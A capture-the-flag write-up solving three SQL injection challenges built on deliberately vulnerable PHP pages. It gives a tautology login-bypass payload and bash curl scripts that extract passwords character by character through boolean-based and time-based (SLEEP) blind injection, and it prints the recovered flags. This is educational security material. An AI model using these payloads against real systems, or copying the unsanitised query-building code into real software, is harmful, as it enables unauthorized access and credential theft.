

## SQL Basics 

# The challenge:

I'm setting up my login page using PHP & MySQL ... How bad can it be? How secure is it? How to login when you don't have the password?

http://54.254.115.115:5000/
```php
<?php
/**
 * CREATE TABLE `users` (
 *  `username` varchar(64) DEFAULT NULL,
 *  `password` varchar(64) DEFAULT NULL
 * );
 * username: flag
 */

if (array_key_exists("username", $_REQUEST)) {
  $link = mysql_connect('mysql', 'simplesql', '<redacted>');
  mysql_select_db('simplesql', $link);
  $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
  
  if (array_key_exists("debug", $_REQUEST)) {
    echo "Executing query: $query<br>";
  }
  
  $res = mysql_query($query, $link);
  if (mysql_num_rows($res) > 0) {
    echo "Successful login! Password is '<redacted>'.<br>";
  } else {
    echo "Access denied!<br>";
  }
  mysql_close($link);
}
?>

    <form action="index.php" method="post">
      Username: <input type="text" name="username" id="username">
      password: <input type="password" name="password" id="password">
      <input type="submit" value="Login">
    </form>
  </div>
</body>
</html>
```


# Writeup

We can see there is a SQL injection vuln. 
We put 
 flag" or "1"="1 
in the username field and got the flag:
axactf{th4t_w45_s0m3_v2ry_b4s1c_stuff}





## SQL Intermediate

# The challenge:

Second attempt at making a PHP page. Just a "user exist" confirmation page. It cannot leak anything right ... But, how can you retrieve the password (base64)?

http://54.254.115.115:5001/
```php
<?php
/**
 * CREATE TABLE `users1` (
 *  `username` varchar(64) DEFAULT NULL,
 *  `password` varchar(64) DEFAULT NULL
 * );
 * 
 * (Note: password is base64)
 * INSERT INTO `users` VALUES ('flag1', 'findme');
 */

if (array_key_exists("username", $_REQUEST)) {
  $link = mysql_connect('localhost', 'blind', '<redacted>');
  mysql_select_db('blind', $link);
  $query = "SELECT * from users1 where username=\"".$_REQUEST["username"]."\"";
  if (array_key_exists("debug", $_GET)) {
    echo "Executing query: $query<br>";
  }

  $res = mysql_query($query, $link);
  if ($res) {
    if (mysql_num_rows($res) > 0) {
      echo "this user exists.<br>";
    } else {
      echo "this user doesn't exist.<br>";
    }
  } else {
    echo "error in query.<br>";
  }
  mysql_close($link);
} else {
?>
    <form action="index.php" method="post">
      Username: <input type="text" name="username" id="username">
      <input type="submit" value="Check existence">
    </form>
<?php } ?>
```


# Writeup

It's again an injection but the only thing we have in return is "this user exists" or "this user doesn't exist".
So if we test 
username=flag1" and password like "a% 
we can know it the password start with a or not.

Writing a small script in bash to do it (it's not clean code :) ): 

```bash
#!/bin/bash    
password=""
passwordreel=""
echo $cmd
arrayName=('+' '/' 'a' 'b' 'c' 'd' 'e' '=' 'f' 'g' 'h' 'i' 'j' 'k' 'l' 'm' 'n' 'o' 'p' 'q' 'r' 's' 't' 'u' 'v' 'w' 'x' 'y' 'z' 'A' 'B' 'C' 'D' 'E' 'F' 'G' 'H' 'I' 'J' 'K' 'L' 'M' 'N' 'O' 'P' 'Q' 'R' 'S' 'T' 'U' 'V' 'W' 'X' 'Y' 'Z' '0' '1' '2' '3' '4' '5' '6' '7' '8' '9')
while true; do
a=0
for i in "${arrayName[@]}"; do
password="$passwordreel$i"
echo $password
cmd=$(curl 'http://54.254.115.115:5001/'  -H 'Connection: keep-alive'   -H 'Cache-Control: max-age=0'   -H 'Upgrade-Insecure-Requests: 1'   -H 'Origin: http://54.254.115.115:5001'   -H 'Content-Type: application/x-www-form-urlencoded'   -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36'   -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9'   -H 'Referer: http://54.254.115.115:5001/'   -H 'Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7'   --data 'username=flag1" and password+like+"'"$password"'%'   --compressed   --insecure)

if [[ $cmd == *"doesn"* ]]; then
  a=$a+1;
  
else
  passwordreel=$password
  echo $password
  break
fi
done
echo $password

done

```

we got  : YXhhY3Rme2cxdjNfbTNfYjRja19teV8zeTM1XzFFBV9iBDFUZH0=
base64 decoded : #axactf{g1v3_m3_b4ck_my_3y35_1_m_bl1nd}


## SQL Hardcore

# The challenge:
Alright, so this time, my PHP app is super protected and cannot leak any information ... because i commented it out!

http://54.254.115.115:5002/

```php
<?php
/**
 * CREATE TABLE `users2` (
 *  `username` varchar(64) DEFAULT NULL,
 *  `password` varchar(64) DEFAULT NULL
 * );
 * 
 * (Note: password is base64)
 * INSERT INTO `users2` VALUES ('flag2', 'findme');
 */

if (array_key_exists("username", $_REQUEST)) {
  $link = mysql_connect('localhost', 'timing', '<redacted>');
  mysql_select_db('timing', $link);
  $query = "SELECT * from users2 where username=\"".$_REQUEST["username"]."\"";
  if (array_key_exists("debug", $_GET)) {
    echo "Executing query: $query<br>";
  }

  $res = mysql_query($query, $link);
  if ($res) {
    if (mysql_num_rows($res) > 0) {
      // echo "this user exists.<br>";
    } else {
      // echo "this user doesn't exist.<br>";
    }
  } else {
    // echo "error in query.<br>";
  }
  mysql_close($link);
} else {
?>
    <form action="index.php" method="post">
      Username: <input type="text" name="username" id="username">
      <input type="submit" value="Check existence">
    </form>
<?php } ?>

```


# Writeup


It's again an injection but with no return.
So we need to use a timing attack. It will test evey character like before but if the character is good, we will design our request to be longer to execute. By measuring the time, we'll know if the character is good or not. The crafted request : 

username=flag2" and IF(BINARY password like "'"$password"'%",SLEEP(10),0) #


Writing a small script in bash to do it (it's not clean code :) ): 

```bash
#!/bin/bash    
password=""
passwordreel=""
#cmd=$(curl 'http://54.254.115.115:5002/'  -H 'Connection: keep-alive'   -H 'Cache-Control: max-age=0'   -H 'Upgrade-Insecure-Requests: 1'   -H 'Origin: http://54.254.115.115:5002'   -H 'Content-Type: application/x-www-form-urlencoded'   -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36'   -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9'   -H 'Referer: http://54.254.115.115:5002/'   -H 'Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7'   --data 'username=flag2" and IF(password like "'"$password"'%",SLEEP(10),0) #'   --compressed   --insecure)


arrayName=('+' '/' 'a' 'b' 'c' 'd' 'e' '=' 'f' 'g' 'h' 'i' 'j' 'k' 'l' 'm' 'n' 'o' 'p' 'q' 'r' 's' 't' 'u' 'v' 'w' 'x' 'y' 'z' 'A' 'B' 'C' 'D' 'E' 'F' 'G' 'H' 'I' 'J' 'K' 'L' 'M' 'N' 'O' 'P' 'Q' 'R' 'S' 'T' 'U' 'V' 'W' 'X' 'Y' 'Z' '0' '1' '2' '3' '4' '5' '6' '7' '8' '9')
while true; do
a=0
for i in "${arrayName[@]}"; do
password="$passwordreel$i"
echo $password
SECONDS=0
heure1=$SECONDS
cmd=$(curl 'http://54.254.115.115:5002/'  -H 'Connection: keep-alive'   -H 'Cache-Control: max-age=0'   -H 'Upgrade-Insecure-Requests: 1'   -H 'Origin: http://54.254.115.115:5002'   -H 'Content-Type: application/x-www-form-urlencoded'   -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36'   -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9'   -H 'Referer: http://54.254.115.115:5002/'   -H 'Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7'   --data 'username=flag2" and IF(BINARY password like "'"$password"'%",SLEEP(10),0) #'   --compressed   --insecure)
heure2=$SECONDS
let diffH=$heure2-$heure1

echo "heure1:"$heure1
echo "heure2:"$heure2
echo "diffH:"$diffH

if [ $diffH -lt 5 ]; then
  a=$a+1;
  echo "nof Found !"
else
  passwordreel=$password
  echo "Found new char : "$password
  break
fi
done
echo $password

done

```

we got  : YXhhY3Rme3QxbTFuZ180dHQ0Y2tfNHIzX2Z1bl9hc19oM2xsfQ==
base64 decoded : #axactf{t1m1ng_4tt4ck_4r3_fun_as_h3ll}


